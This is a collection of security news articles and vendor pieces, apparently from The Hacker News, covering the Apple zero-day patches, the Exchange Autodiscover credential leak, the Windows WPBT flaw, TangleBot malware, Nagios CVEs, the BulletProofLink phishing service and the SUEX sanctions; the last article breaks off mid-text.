'text': 'Apple on Thursday released security updates to fix multiple security vulnerabilities in older versions of iOS and macOS that it says have been detected in exploits in the wild, in addition to expanding patches for a previously plugged security weakness abused by NSO Group’s Pegasus surveillance tool to target iPhone users.\n\nChief among them is CVE-2021-30869, a type confusion flaw that resides in the kernel component XNU developed by Apple that could cause a malicious application to execute arbitrary code with the highest privileges. The Cupertino-based tech giant said it addressed the bug with improved state handling.\nGoogle’s Threat Analysis Group, which is credited with reporting the flaw, said it detected the vulnerability being “used in conjunction with a N-day remote code execution targeting WebKit.“\nTwo other flaws include CVE-2021-30858 and CVE-2021-30860, both of which were resolved by the company earlier this month following disclosure from the University of Toronto’s Citizen Lab about a previously unknown exploit called “FORCEDENTRY“ (aka Megalodon) that could infect Apple devices without so much as a click.\nThe zero-click remote attack weaponizing CVE-2021-30860 is said to have been carried out by a customer of the controversial Israeli company NSO Group since at least February 2021. The scale and scope of the operation remains unclear as yet.\nIt relied on iMessage as an entry point to send malicious code that stealthily installed the Pegasus spyware on the devices and exfiltrate sensitive data without tipping the victims off. The exploit is also significant for its ability to get around defenses built by Apple in iOS 14 — called BlastDoor — to prevent such intrusions by filtering untrusted data sent over the texting application.\n\nThe patches are available for devices running macOS Catalina and iPhone 5s, iPhone 6, iPhone 6 Plus, iPad Air, iPad mini 2, iPad mini 3, and iPod touch (6th generation) running iOS 12.5.4. \nThe development also comes as security researchers have disclosed unpatched zero-day flaws in iOS, including a lock screen bypass bug and a clutch of vulnerabilities that could be abused by an app to gain access to users’ Apple ID email addresses and full names, check if a specific app is installed on the device given its bundle ID, and even retrieve Wi-Fi information without proper authorization.\nResearcher Denis Tokarev (aka illusionofchaos), who disclosed the latter three issues, said they were reported to Apple between March 10 and May 4, claiming what was “a frustrating experience participating in Apple Security Bounty program“ for its failure to fix the issues despite having them responsibly disclosed “up to half a year“ ago.\nIndeed, a Washington Post article published two weeks ago revealed how the company sits on a “massive backlog“ of vulnerability reports, leaving them unresolved for months, hands out lower monetary payouts to bug hunters, and, in some cases, outright bans researchers from its Developer Program for filing reports.\n\n\nFound this article interesting?

{'title': 'Microsoft Exchange Bug Exposes ~100,000 Windows Domain Credentials',
'text': 'An unpatched design flaw in the implementation of Microsoft Exchange’s Autodiscover protocol has resulted in the leak of approximately 100,000 login names and passwords for Windows domains worldwide.\n“This is a severe security issue, since if an attacker can control such domains or has the ability to ’sniff’ traffic in the same network, they can capture domain credentials in plain text (HTTP basic authentication) that are being transferred over the wire,“ Guardicore’s Amit Serper said in a technical report.\n“Moreover, if the attacker has DNS-poisoning capabilities on a large scale (such as a nation-state attacker), they could systematically syphon out leaky passwords through a large-scale DNS poisoning campaign based on these Autodiscover TLDs [top-level domains].“\n\nThe Exchange Autodiscover service enables users to configure applications such as Microsoft Outlook with minimal user input, allowing just a combination of email addresses and passwords to be utilized to retrieve other predefined settings required to set up their email clients.\nThe weakness discovered by Guardicore resides in a specific implementation of Autodiscover based on the POX (aka “plain old XML“) XML protocol that causes the web requests to Autodiscover domains to be leaked outside of the user’s domain but in the same top-level domain.\n\nIn a hypothetical example where a user’s email address is “user@example.com,“ the email client leverages the Autodiscover service to construct a URL to fetch the configuration data using any of the below combinations of the email domain, a subdomain, and a path string, failing which it instantiates a “back-off“ algorithm —\nhttps://Autodiscover.example.com/Autodiscover/Autodiscover.xmlhttps://Autodiscover.example.com/Autodiscover/Autodiscover.xmlhttps://example.com/Autodiscover/Autodiscover.xmlhttps://example.com/Autodiscover/Autodiscover.xml\n“This ’back-off’ mechanism is the culprit of this leak because it is always trying to resolve the Autodiscover portion of the domain and it will always try to ’fail up,’ so to speak,“ Serper explained. “Meaning, the result of the next attempt to build an Autodiscover URL would be: ’https://Autodiscover.com/Autodiscover/Autodiscover.xml.’ This means that whoever owns Autodiscover.com will receive all of the requests that cannot reach the original domain.“\n\nArmed with this discovery and by registering a number of Autodiscover top-level domains (e.g., Autodiscover.com[.]br, Autodiscover.com[.]cn, Autodiscover[.]in, etc.) as honeypots, Guardicore said it was able to access requests to Autodiscover endpoints from different domains, IP addresses, and clients, netting 96,671 unique credentials sent from Outlook, mobile email clients, and other applications interfacing with Microsoft’s Exchange server over a four-month period between April 16, 2021, and August 25, 2021.\n\nThe domains of those leaked credentials belonged to several entities from multiple verticals spanning publicly traded corporations in China, investment banks, food manufacturers, power plants, and real estate firms, the Boston-based cybersecurity company noted.\nTo make matters worse, the researchers developed an “ol’ switcheroo“ attack that involved sending a request to the client to downgrade to a weaker authentication scheme (i.e., HTTP Basic authentication) in place of secure methods like OAuth or NTLM, prompting the email application to send the domain credentials in cleartext.\nTo mitigate Autodiscover leaks, it’s recommended that Exchange users disable support for basic authentication and add a list of all possible Autodiscover.TLD domains to a local hosts file or firewall configuration to prevent unwanted Autodiscover domain resolution. Software vendors are also advised to avoid implementing a “back-off“ procedure that fails upwards to construct unforeseen domains like “Autodiscover.“\n“Oftentimes, attackers will try to cause users to send them their credentials by applying various techniques, whether technical or through social engineering,“ Serper said. “However, this incident shows us that passwords can be leaked outside of the organization’s perimeter by a protocol that was meant to streamline the IT department’s operations with regards to email client configuration without anyone from the IT or security department even being aware of it, which emphasises the importance of proper segmentation and Zero Trust.“\n\n\nFound this article interesting?

{'title': 'A New Bug in Microsoft Windows Could Let Hackers Easily Install a Rootkit',
'text': 'Security researchers have disclosed an unpatched weakness in Microsoft Windows Platform Binary Table (WPBT) affecting all Windows-based devices since Windows 8 that could be potentially exploited to install a rootkit and compromise the integrity of devices.\n“These flaws make every Windows system vulnerable to easily-crafted attacks that install fraudulent vendor-specific tables,“ researchers from Eclypsium said in a report published on Monday. “These tables can be exploited by attackers with direct physical access, with remote access, or through manufacturer supply chains. More importantly, these motherboard-level flaws can obviate initiatives like Secured-core because of the ubiquitous usage of ACPI [Advanced Configuration and Power Interface] and WPBT.“\n\nWPBT, introduced with Windows 8 in 2012, is a feature that enables “boot firmware to provide Windows with a platform binary that the operating system can execute.“ \nIn other words, it allows PC manufacturers to point to signed portable executables or other vendor-specific drivers that come as part of the UEFI firmware ROM image in such a manner that it can be loaded into physical memory during Windows initialization and prior to executing any operating system code.\nThe main objective of WPBT is to allow critical features such as anti-theft software to persist even in scenarios where the operating system has been modified, formatted, or reinstalled. But given the functionality’s ability to have such software “stick to the device indefinitely,“ Microsoft has warned of potential security risks that could arise from misuse of WPBT, including the possibility of deploying rootkits on Windows machines.\n\n“Because this feature provides the ability to persistently execute system software in the context of Windows, it becomes critical that WPBT-based solutions are as secure as possible and do not expose Windows users to exploitable conditions,“ the Windows maker notes in its documentation. “In particular, WPBT solutions must not include malware (i.e., malicious software or unwanted software installed without adequate user consent).“\nThe vulnerability uncovered by the enterprise firmware security company is rooted in the fact that the WPBT mechanism can accept a signed binary with a revoked or an expired certificate to completely bypass the integrity check, thus permitting an attacker to sign a malicious binary with an already available expired certificate and run arbitrary code with kernel privileges when the device boots up.\n\nIn response to the findings, Microsoft has recommended using a Windows Defender Application Control (WDAC) policy to tightly restrict what binaries can be permitted to run on the devices.\nThe latest disclosure follows a separate set of findings in June 2021, which involved a clutch of four vulnerabilities — collectively called BIOS Disconnect — that could be weaponized to gain remote execution within the firmware of a device during a BIOS update, further highlighting the complexity and challenges involved in securing the boot process.\n“This weakness can be potentially exploited via multiple vectors (e.g., physical access, remote, and supply chain) and by multiple techniques (e.g., malicious bootloader, DMA, etc),“ the researchers said. “Organizations will need to consider these vectors, and employ a layered approach to security to ensure that all available fixes are applied and identify any potential compromises to devices.“\n\n\nFound this article interesting?

{'title': 'Why You Should Consider QEMU Live Patching',
'text': 'Sysadmins know what the risks are of running unpatched services. Given the choice, and unlimited resources, most hardworking administrators will ensure that all systems and services are patched consistently.\nBut things are rarely that simple. Technical resources are limited, and patching can often be more complicated than it appears at first glance. Worse, some services are so hidden in the background, that they just don’t make it onto the list of things to be patched.\nQEMU is one of those services that tend to create difficulties with patching. It works away in the background and is easy to take for granted. Plus, patching QEMU involves significant technical and practical challenges – while requiring enormous resources.\nIn this article, we’ll address some of the difficulties around patching QEMU, and point to a solution that takes the toughest bits out of QEMU patching.\nIgnoring QEMU patching is a big risk\nYou’ll probably know about it if you’re using QEMU – short, of course, for Quick EMUlator – because QEMU will be delivering critical virtualization capabilities that support your workloads. That said, what you might not realize is that just like the host OS, the virtualized OS, and all your applications, QEMU also needs to be updated on a regular basis – even though it works in the background.\nIt’s not just a scare story. QEMU has been proven to be just as vulnerable as any other service, library, or component. For example, in 2015, the virtual floppy controller in QEMU was found to be vulnerable: it was called the Venom bug, and affected systems whether the QEMU virtual floppy was in use, or not.\nLikewise, in 2019, organizations that use the KVM/QEMU hypervisor to run Linux instances were at the receiving end of a security flaw that put countless systems at risk. And, just like any other commonly used software, it’s likely that more flaws will be discovered in QEMU.\nIn other words, if you don’t patch, your systems will be at risk. But there’s a problem: when it comes to QEMU, patching isn’t straightforward because patching QEMU affects the underlying virtualized workload: while you stop to restart QEMU, the virtual workload must stop too.\nYour options for patching QEMU\nPatching a single service on a single system usually isn’t an issue – assuming you remember to do it – and even patching a single OS isn’t that hard as you can usually cope with a single restart, but it is disruptive nonetheless as every application restarts. Patching a fleet of operating systems is a lot tougher, because it could imply thousands of restarts and disruption to countless numbers of apps. \nBecause QEMU is a virtualization service patching has far bigger implications than simply patching another application. Patch QEMU and you have to restart the underlying operating systems that run on it.\nIn others, applying a patch to a single service – QEMU – can lead to the forced restart of thousands of operating systems. It significantly complicates QEMU patching – and it can mean that tech teams sometimes delay patching QEMU, trying to justify taking a risk with vulnerabilities because they view the disruption as too big.\nPatching is a must, however, and there are of course shortcuts when it comes to updating QEMU – and the right way to do it. Here are some of your options.\nThe quick but very risky method\nYour simplest, but most disruptive option, is to simply apply a patch, restart, and see what happens. If it’s just a single machine, you could be okay – after all, you’ll be aware that you’re going to need to restart your workload.\nHowever, if you’re managing QEMU across a server fleet, or in environments where there are external stakeholders evolved, simply patching and triggering reboots across all the machines will, without a doubt, lead to many upset people.\nA sensible approach\nInstead of just restarting, most level-headed sysadmins will go and add a bit more planning to the above procedure. To start off with, you’ll notify everyone affected by setting up a planned maintenance window with scheduled downtime – say, a month in advance. The problem is, of course, that you’d have to hope you are not hacked within that month.\nHowever, during the maintenance window, you’ll have an opportunity to patch without upsetting anyone, permitted a few hours of no service is tolerated. Once you restart QEMU, all the virtual machines should restart, and you can inform the stakeholders that patching is complete. \nNonetheless, you’re likely going to set yourself up for a fair period of troubleshooting after the restarts, and though you won’t get anything thrown at you, even planned maintenance windows are challenging for everyone involved. There are also many scenarios where planned maintenance that involves actual downtime simply wouldn’t be acceptable.\nEnterprise-grade approach\nSome workloads won’t deal well with the disruption caused by operating system restarts. In enterprise environments, you’ll need another plan. You’ll need to take a much more involved approach: a live migration of the QEMU workload.\nYou can only do this if your workload is already split across multiple hosts, and where you have high availability activated across those nodes. You then kick off patching by informing your stakeholders that a maintenance window will be due, which will affect performance – but that it shouldn’t affect availability.\nRelying on your high availability operation, you migrate the virtual machines across, then stop QEMU, patch it, and restart it. After the restart, you migrate the virtual machines back to the patched QEMU instances.\nDone correctly, patching by migration ensures that your QEMU instances are safely patched without upsetting stakeholders through real downtime.\nThe problem with QEMU migration\nWe’ve talked about three different approaches to patching QEMU, and the migration route is, without a doubt, the best option for organizations that rely on QEMU to drive large workloads. But even this enterprise-grade approach carries risks. You are performing a very complex procedure that, as all complex procedures, can always fail.\nSome of the things that go wrong include:\nPerformance may be significantly degraded during migration – which may impact stakeholder and user satisfaction, particularly where migration takes longer than expected.Coordinating a maintenance window, which is nonetheless required due to possible performance disruption, can still be challenging and time-consuming – while leading to a degree of annoyance for stakeholders.During the migration operation, minor network packet loss should usually be tolerated – but some workloads can be sensitive to this, which can cause significant problems.You need to test and verify post-migration – you can’t assume that everything has migrated smoothly, and you may need to involve stakeholders through this testing process.\nPerforming QEMU updates through a migration process limits disruption, but your team nonetheless needs to invest significant amounts of time in the process. The risk that something goes wrong remains – and there’s a small risk of catastrophic failure.\nSo, while it’s unlikely your stakeholders will see significant disruption, your team will need to do careful planning. Finally, it’s worth considering that any adverse outcome of the migration process – small as the risk may be – will reflect negatively on you and your team.\nLive patching as an alternative\nIn the past, patching always depended on a stop, patch, restart process. Yes, migration helps by ensuring the instances that require restarting are available. But a fresher approach has become increasingly common: patching on the fly, without restarting the software that’s being patched.\nCalled live patching, this approach significantly simplifies the patching process. Instead of requiring a restart, live patching updates your server or the service you need patching on the go. That’s the case for QEMU live patching too, where you can now install the latest patches for QEMU – without setting up a maintenance window, nor the need to execute and plan migration.\nThat’s why QEMUCare, from TuxCare, is a game-changer for teams that run workloads on QEMU. QEMUCare doesn’t just make the update and migration process easier – it takes it away completely. Your QEMU/KVM instances are patched instantly with no impact on the underlying virtual machine.\nChoosing the live patching route brings a whole range of advantages:\nConsistent patching. A good live patching solution such as QEMUCare will automatically detect the release of a new patch and initiate the patching process. Your team doesn’t even need to monitor for patch releases: QEMUCare just takes care of it. That means that your team patches more consistently – reducing the risk that your QEMU instances are vulnerable to a new exploit.Happy stakeholders. Because QEMUCare works in the background, automatically patching without rebooting QEMU, your stakeholders – including internal users and your customers or clients – won’t even know that you’re performing patching. It all happens seamlessly without the need for planned maintenance windows.Eliminates labor hours. While you have the option of trying to take a shortcut, the enterprise-grade, migration-driven process for patching we described before is your only realistic choice. It is very labor-intensive, however, consuming lots of hours from your team – whereas QEMUCare consumes almost zero hours from your team.Minimizes risk of error. Because you don’t have to migrate your workloads manually there is less risk that patching QEMU will cause you significant problems.

'text': 'An “insidious“ new SMS smishing malware has been found targeting Android mobile users in the U.S. and Canada as part of an ongoing campaign that uses SMS text message lures related to COVID-19 regulations and vaccine information in an attempt to steal personal and financial data.\nProofpoint’s messaging security subsidiary Cloudmark coined the emerging malware “TangleBot.“\n\n“The malware has been given the moniker TangleBot because of its many levels of obfuscation and control over a myriad of entangled device functions, including contacts, SMS and phone capabilities, call logs, internet access, and camera and microphone,“ the researchers said.Besides capabilities to obtain sensitive information, the malware is engineered to control device interaction with banking or financial apps using overlay screens and plunder account credentials from financial activities initiated on the phones.\n\nThe attacks themselves originate from SMS messages that claim to be “new regulations about COVID-19“ or confirmation for an “appointment for the 3rd [vaccine] dose,“ urging users to click on an accompanying link that, when visited, notifies the victim that their Adobe Flash player is out-of-date and must be updated. Opting to update the software results in the installation of the TangleBot malware on the Android device.\n\nIn the next phase, TangleBot is granted wide-ranging permissions to access contacts, SMS, call logs, internet, camera and microphone, and GPS, thus enabling the operators to intercept phone calls, send and receive text messages, record the camera, screen, or microphone audio or stream them directly to the attacker, turning it into full-fledged spyware.\n\n“Harvesting of personal information and credentials in this manner is extremely troublesome for mobile users because there is a growing market on the dark web for detailed personal and account data,“ the researchers said. “Even if the user discovers the TangleBot malware and it is able to remove it, the attacker may not use the stolen information for some period of time, rendering the victim oblivious of the theft.“\n\n\nFound this article interesting?

'text': 'More than one terabyte of data containing 5.5 million files has been left exposed, leaking personal information of over 100,000 customers of a Colombian real estate firm, according to cybersecurity company WizCase.\nThe breach was discovered by Ata Hakçıl and his team in a database owned by Coninsa Ramon H, a company that specializes in architecture, engineering, construction, and real estate services. “There was no need for a password or login credentials to see this information, and the data was not encrypted,“ the researchers said in an exclusive report shared with The Hacker News.\n\nThe data exposure is the result of a misconfigured Amazon Web Services (AWS) Simple Storage Service (S3) bucket, causing sensitive information such as clients’ names, photos, and addresses to be disclosed. The details stored in the bucket range from invoices and income documents to quotes and account statements dating between 2014 and 2021. The complete list of information contained in the documents is as follows -\nFull namesPhone numbersEmail addressesResidential addressesAmounts paid for estates, andAsset values\nIn addition, the bucket is also said to contain a database backup that includes additional information such as profile pictures, usernames, and hashed passwords. Troublingly, the researchers said they also found malicious, backdoor code in the bucket that could be exploited to gain persistent access to the website and redirect unsuspecting visitors to fraudulent pages.\nIt’s not immediately clear if these files were put to use by bad actors in any campaign. Coninsa Ramon H did not respond to inquiries from The Hacker News sent via email regarding the vulnerability.\n\n“Based on viewing a sample of the documents, […] the misconfiguration revealed $140 to $200 billion in transactions, or an annual transaction history of at least $46 billion,“ the researchers said. “For perspective, that’s roughly 14% of Colombia’s total economy.“\nThe highly confidential nature of the data contained within the database makes it highly susceptible to exploitation by cybercriminals to mount phishing attacks and conduct a variety of fraud or scam activities, including tricking users into making additional payments and worse, reveal more personally identifiable information by tampering with the website’s backend infrastructure.\n\n\nFound this article interesting?

'text': 'Microsoft has opened the lid on a large-scale phishing-as-a-service (PHaaS) operation that’s involved in selling phishing kits and email templates as well as providing hosting and automated services at a low cost, thus enabling cyber actors to purchase phishing campaigns and deploy them with minimal efforts.\n“With over 100 available phishing templates that mimic known brands and services, the BulletProofLink operation is responsible for many of the phishing campaigns that impact enterprises today,“ Microsoft 365 Defender Threat Intelligence Team said in a Tuesday report.\n\n“BulletProofLink (also referred to as BulletProftLink or Anthrax by its operators in various websites, ads, and other promotional materials) is used by multiple attacker groups in either one-off or monthly subscription-based business models, creating a steady revenue stream for its operators.“\nThe tech giant said it uncovered the operation during its investigation of a credential phishing campaign that used the BulletProofLink phishing kit on either on attacker-controlled sites or sites provided by BulletProofLink as part of their service. The existence of the operation was first made public by OSINT Fans in October 2020.\n\nPhishing-as-a-service differs from traditional phishing kits in that unlike the latter, which are sold as one-time payments to gain access to packaged files containing ready-to-use email phishing templates, they are subscription-based and follow a software-as-a-service model, while also expanding on the capabilities to include built-in site hosting, email delivery, and credential theft.\nBelieved to have been active since at least 2018, BulletProofLink is known to operate an online portal to advertise their toolset for as much as $800 a month and allow cybercrime gangs to register and pay for the service. Customers can also avail of a 10% discount should they opt to subscribe to their newsletter, not to mention pay anywhere between $80 to $100 for credential phishing templates that allow them to siphon login information entered by unsuspected victims upon clicking a malicious URL in the email message.\n\nTroublingly, the stolen credentials are not only sent to the attackers but also to the BulletProofLink operators using a technique called “double theft“ in a modus operandi that mirrors the double extortion attacks employed by ransomware gangs.\n“With phishing kits, it is trivial for operators to include a secondary location for credentials to be sent to and hope that the purchaser of the phish kit does not alter the code to remove it,“ the researchers said. “This is true for the BulletProofLink phishing kit, and in cases where the attackers using the service received credentials and logs at the end of a week instead of conducting campaigns themselves, the PhaaS operator maintained control of all credentials they resell.“\n\n\nFound this article interesting?

{'title': 'New Nagios Software Bugs Could Let Hackers Take Over IT Infrastructures',
'text': 'As many as 11 security vulnerabilities have been disclosed in Nagios network management systems, some of which could be chained to achieve pre-authenticated remote code execution with the highest privileges, as well as lead to credential theft and phishing attacks. \nIndustrial cybersecurity firm Claroty, which discovered the flaws, said flaws in tools such as Nagios make them an attractive target owing to their “oversight of core servers, devices, and other critical components in the enterprise network.“ The issues have since been fixed in updates released in August with Nagios XI 5.8.5 or above, Nagios XI Switch Wizard 2.5.7 or above, Nagios XI Docker Wizard 1.13 or above, and Nagios XI WatchGuard 1.4.8 or above.\n“SolarWinds and Kaseya were likely targeted not only because of their large and influential customer bases, but also because of their respective technologies’ access to enterprise networks, whether it was managing IT, operational technology (OT), or internet of things (IoT) devices,“ Claroty’s Noam Moshe said in a write-up published Tuesday, noting how the intrusions targeting the IT and network management supply chains emerged as a conduit to compromise thousands of downstream victims.\n\nNagios Core is a popular open-source network health tool analogous to SolarWinds Network Performance Monitor (NPM) that’s used for keeping tabs on IT infrastructure for performance issues and sending alerts following the failure of mission-critical components. Nagios XI, a proprietary web-based platform built atop Nagios Core, provides organizations with extended insight into their IT operations with scalable monitoring and a customizable high-level overview of hosts, services, and network devices.\n\nChief among the issues are two remote code execution flaws (CVE-2021-37344, CVE-2021-37346) in Nagios XI Switch Wizard and Nagios XI WatchGuard Wizard, an SQL injection vulnerability (CVE-2021-37350) in Nagios XI, and a server-side request forgery (SSRF) affecting Nagios XI Docker Wizard, as well as a post-authenticated RCE in Nagios XI’s AutoDiscovery tool (CVE-2021-37343). The complete list of 11 flaws is as follows -\nCVE-2021-37343 (CVSS score: 8.8) - A path traversal vulnerability exists in Nagios XI below version 5.8.5 AutoDiscovery component and could lead to post-authenticated RCE under the security context of the user running Nagios.CVE-2021-37344 (CVSS score: 9.8) - Nagios XI Switch Wizard before version 2.5.7 is vulnerable to remote code execution through improper neutralization of special elements used in an OS Command (OS Command injection).CVE-2021-37345 (CVSS score: 7.8) - Nagios XI before version 5.8.5 is vulnerable to local privilege escalation because xi-sys.cfg is being imported from the var directory for some scripts with elevated permissions.CVE-2021-37346 (CVSS score: 9.8) - Nagios XI WatchGuard Wizard before version 1.4.8 is vulnerable to remote code execution through Improper neutralization of special elements used in an OS Command (OS Command injection).CVE-2021-37347 (CVSS score: 7.8) - Nagios XI before version 5.8.5 is vulnerable to local privilege escalation because getprofile.sh does not validate the directory name it receives as an argument.CVE-2021-37348 (CVSS score: 7.5) - Nagios XI before version 5.8.5 is vulnerable to local file inclusion through an improper limitation of a pathname in index.php.CVE-2021-37349 (CVSS score: 7.8) - Nagios XI before version 5.8.5 is vulnerable to local privilege escalation because cleaner.php does not sanitize input read from the database.CVE-2021-37350 (CVSS score: 9.8) - Nagios XI before version 5.8.5 is vulnerable to SQL injection vulnerability in Bulk Modifications Tool due to improper input sanitization.CVE-2021-37351 (CVSS score: 5.3) - Nagios XI before version 5.8.5 is vulnerable to insecure permissions and allows unauthenticated users to access guarded pages through a crafted HTTP request to the server.CVE-2021-37352 (CVSS score: 6.1) - An open redirect vulnerability exists in Nagios XI before version 5.8.5 that could lead to spoofing. To exploit the vulnerability, an attacker could send a link that has a specially-crafted URL and convince the user to click the link.CVE-2021-37353 (CVSS score: 9.8) - Nagios XI Docker Wizard before version 1.1.3 is vulnerable to SSRF due to improper sanitization in table_population.php\n\nIn a nutshell, the flaws could be combined by attackers to drop a web shell or execute PHP scripts and elevate their privileges to root, thus achieving arbitrary command execution in the context of the root user. As a proof-of-concept, Claroty chained CVE-2021-37343 and CVE-2021-37347 to gain a write-what-where primitive, allowing an attacker to write content to any file in the system.\n\n“[Network management systems] require extensive trust and access to network components in order to properly monitor network behaviors and performance for failures and poor efficiency,“ Moshe said. “They may also extend outside your network through the firewall to attend to remote servers and connections. Therefore, these centralized systems can be a tasty target for attackers who can leverage this type of network hub, and attempt to compromise it in order to access, manipulate, and disrupt other systems.“\nThe disclosure is the second time nearly dozen vulnerabilities have been disclosed in Nagios since the start of the year. Earlier this May, Skylight Cyber revealed 13 security weaknesses in the network monitoring application that could be abused by an adversary to hijack the infrastructure without any operator intervention.\n\n\nFound this article interesting?

{'title': 'How Cynet’s Response Automation Helps Organizations Mitigate Cyber Threats',
'text': 'One of the determining factors of how much damage a cyber-attack cause is how fast organizations can respond to it. Time to response is critical for security teams, and it is a major hurdle for leaner teams.\nTo help improve this metric and enhance organizations’ ability to respond to attacks quickly, many endpoint detection and response (EDR) and extended detection and response (XDR) vendors have started including some form of automation in their platforms to reduce the need for manual intervention.\nXDR provider Cynet claims that they go beyond existing solutions when it comes to security automation. More than automating individual components, the Cynet 360 platform (see a live demo here) offers automation across every phase of incident response – from detection through remediation. The company uses a variety of tools and techniques to keep organizations safe and quickly respond to any emerging threat.\n\nHow Cynet removes the guesswork from Incident Response \nCynet fully automates the response workflow from start to finish. It also eliminates or greatly minimizes the need for manual efforts and ensures key response details and tasks are performed quickly and effectively.\nThe platform starts by grouping alerts logically into incidents that create a better picture of a potential attack. This helps reduce alert fatigue and offers greater threat context.\nThe platform also provides an Incident Engine that automates: \nInvestigation – automated root cause and impact analysis Findings – actionable conclusions on attack components and their affected entitiesRemediation – removing any malicious presence and activity across users, networks, endpoints, and infrastructure.\nDeploying preset remediation actions\nOne way Cynet helps organizations speed their time to response is by deploying a wide range of remediation tools for infected hosts, compromised user accounts, and attacker-controlled network traffic. The company provides a broad set of remediation actions directly out of the box. As a result, it significantly raises the number of attacks the system can respond to automatically.\nUsing and building playbooks\nAnother automation-focused feature offered by Cynet is its ability to use both pre-built and customized playbooks. These are chains of remediation actions that can be automatically executed upon detection of specific threats and attacks. Cynet comes pre-packaged with multiple ready-made playbooks, but users can quickly build their own chains based on organizational needs, specific threats, and protocols.\nCustom Remediations\nTeams can create playbooks that trigger on specific alerts, or suspicious activities. Playbooks are bult using drag-and-drop, letting teams quickly build the right flows of response actions to ensure a fast and thorough resolution.\nThe Incident Engine \nCynet’s Incident Engine is another unique tool the company offers to give teams much greater visibility into attacks and their causes. The engine lays out the incident in a visual timeline to help teams better determine the attack’s root cause and scope, to its eventual resolution.\nThe Incident Engine\nThe Incident Engine starts by asking a series of questions to determine the cause and scale of the attack. Once it has findings, it can take the automated actions necessary to remediate a threat. On the timeline, users can view each specific remediation and the event or alert that triggered it.\nEspecially for lean security teams that don’t always have the resources or bandwidth available to investigate an attack after the fact, the Incident Engine offers an excellent way to understand threats and ensure dangerous attack components are not overlooked.\nThe engine will also search the entire environment to check for similar threat components. If found, the Incident Engine can act automatically to remove any remaining threats. \nYou can learn more about Cynet’s automated response capabilities by requesting a live demo here.\n\n\nFound this article interesting?

{'title': 'US Sanctions Cryptocurrency Exchange SUEX for Aiding Ransomware Gangs',
'text': 'The U.S. Treasury Department on Tuesday imposed sanctions on Russian cryptocurrency exchange Suex for helping facilitate and launder transactions from at least eight ransomware variants as part of the government’s efforts to crack down on a surge in ransomware incidents and make it difficult for bad actors to profit from such attacks using digital currencies.\n“Virtual currency exchanges such as SUEX are critical to the profitability of ransomware attacks, which help fund additional cybercriminal activity,“ the department said in a press release. “Analysis of known SUEX transactions shows that over 40% of SUEX’s known transaction history is associated with illicit actors. SUEX is being designated pursuant to Executive Order 13694, as amended, for providing material support to the threat posed by criminal ransomware actors.“\n\nAccording to blockchain analytics firm Chainalysis, SUEX is legally registered in the Czech Republic and operates out of offices in Moscow and St. Petersburg, with the exchange’s 25 deposit addresses receiving over $481 million in Bitcoin alone since becoming active in February 2018. A substantial portion of those transfers — amounting to nearly $162 million — originate from ransomware operators such as Ryuk, Conti, and Maze, cryptocurrency scam operators, darknet markets, and high-risk exchanges.\n\nThe development marks the first instance of such an action against a virtual currency exchange and follows a wave of devastating ransomware attacks that have increased in frequency and severity, hobbling critical infrastructure and numerous entities in recent months and making them an economical and national security threat. In 2020 alone, ransomware payments are said to have totaled over $400 million, more than four times that of 2019, with virtual currencies emerging as the principal means to conduct transfers and associated money laundering activities.\nRansomware refers to malicious software that’s engineered to block access to computer systems, often by encrypting data or programs to extort ransom payments from victims in exchange for decrypting and restoring access to their systems or data. This is also accompanied by a threat to publicly disclose targets’ sensitive files in a technique called double extortion.\n“These payments represent just a fraction of the economic harm caused by cyber-attacks, but they underscore the objectives of those who seek to weaponize technology for personal gain,“ the Treasury Department added.\n\nOfficials also emphasized the role of virtual currencies in furthering illicit activity through peer-to-peer exchangers, mixers, and exchanges, not to mention help evade sanctions, carry out ransomware schemes, and conduct other financially motivated cyber crimes, making such technologies ripe for exploitation by bad actors. However, in SUEX’s case, it helped facilitate illegal activity “for their own illicit gains.“\n\nBesides freezing all property assets of the designated target that are subject to U.S. jurisdiction, U.S. citizens are generally banned from performing transactions with sanctioned entities, and financial institutions that engage in certain activities with them could themselves face sanctions or be subjected to enforcement actions.\nWhat’s more, the U.S.Office of Foreign Assets Control (OFAC) released an updated advisory on the potential sanctions risks arising out of settling with ransomware actors, urging victims and related companies to not only refrain from paying ransoms but also “report these incidents to and fully cooperate with law enforcement as soon as possible.“\n“Shutting down cryptocurrency-based money launderers is one of the most important strategies to combat cryptocurrency-related crime,“ Chainalysis said. “It all comes down to incentives. If cybercriminals have no way of moving ill-gotten cryptocurrency to services where it can be stored safely or converted into cash, there’s much less reason for them to use cryptocurrency in the first place.“\n\n\nFound this article interesting?

{'title': 'The Gap in Your Zero Trust Implementation',
'text': 'Over the last several years, there have been numerous high-profile security breaches. These breaches have underscored the fact that traditional cyber defenses have become woefully inadequate and that stronger defenses are needed. As such, many organizations have transitioned toward a zero trust security model.\nA zero trust security model is based on the idea that no IT resource should be trusted implicitly. Prior to the introduction of zero trust security, a user who authenticated into a network was trustworthy for the duration of their session, as was the user’s device.\nIn a zero trust model, a user is no longer considered to be trustworthy just because they entered a password at the beginning of their session. Instead, the user’s identity is verified through multi-factor authentication, and the user may be prompted to re-authenticate if they attempt to access resources that are particularly sensitive or if the user attempts to do something out of the ordinary.\nHow Complicated is it to Implement Zero Trust Within Your Organization? \nZero trust security tends to be difficult to implement for several reasons. First, zero trust security often means operating in a vastly different manner than what IT and the organization’s users are used to. For the IT department, this almost always means learning new skills and giving up certain privileges. For end-users, the transition to zero trust security may mean working in a far more restrictive environment.\nAnother thing that makes zero trust security difficult to implement is that zero trust might best be thought of as a state that organizations aspire to achieve. There is no product that an organization can purchase that will instantly transition the organization into a zero trust model. Similarly, there is no procedure that an organization can follow to configure their IT resources for zero trust. The way in which zero trust is implemented varies widely from one organization to the next.\nWhat types of additional security does a zero trust model provide? \nWhile it is sometimes tempting to think of the zero trust model as being user-centric, zero trust really means making sure that all actions can be validated and that no actions can be performed without the proper validation. Every zero trust implementation is different, but here are several attributes that are commonly included in zero trust:\nMulti-factor authentication is required for all user accounts. Additionally, users may be required to prove their identities if they stay logged in for an excessive amount of time, attempt to do something unusual, or try to access sensitive information.Devices are validated to ensure that they are not compromised. At one time, users logged in almost solely from domain-joined corporate desktops that were hardened by group policies and other security mechanisms. Today it is just as common for a user to log in from a personal device. The zero trust model often focuses on making sure that a device meets certain criteria before allowing it to access the network. In the case of a Windows device for example, the device might be required to have the Windows Firewall enabled, antivirus software installed, and the latest Windows updates installed.Least Privileged Access is the norm. Users are given access to only those resources that are needed for a user to do their job, and nothing more. Additionally, users only receive write access to a resource if such access is necessary.AI is used to enhance security. Artificial Intelligence and machine learning monitor the network and detect any sort of abnormal behavior that might signal a security issue.\nAny examples where a zero trust model would have prevented a cyber-attack? \nMost security breaches could conceivably have been stopped by a zero trust model. 